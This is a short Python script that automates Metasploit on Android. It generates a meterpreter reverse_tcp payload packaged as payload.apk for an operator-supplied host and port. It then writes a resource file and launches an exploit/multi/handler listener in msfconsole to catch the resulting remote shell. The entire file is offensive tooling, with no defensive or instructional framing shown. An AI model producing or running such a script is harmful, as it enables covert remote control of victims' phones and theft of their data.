import os
import subprocess

def create_payload(lhost, lport):
    payload = "android/meterpreter/reverse_tcp"
    output_file = "payload.apk"

    # Command to generate the payload
    msfvenom_command = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} R > {output_file}"

    print("Creating payload with the following command:")
    print(msfvenom_command)

    # Run the msfvenom command
    subprocess.run(msfvenom_command, shell=True, check=True)
    print(f"Payload created: {output_file}")

def start_msfconsole(lhost, lport):
    # Commands to run in msfconsole
    msf_commands = f"""
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST {lhost}
set LPORT {lport}
exploit
"""
    # Write the commands to a resource file
    with open("msfconsole.rc", "w") as file:
        file.write(msf_commands)
    
    print("Starting msfconsole with the following commands:")
    print(msf_commands)

    # Start msfconsole with the resource file
    subprocess.run("msfconsole -r msfconsole.rc", shell=True)

if __name__ == "__main__":
    lhost = input("Enter the LHOST (your IP address): ")
    lport = input("Enter the LPORT (default is 4444): ")
    if not lport:
        lport = "4444"

    create_payload(lhost, lport)
    start_msfconsole(lhost, lport)
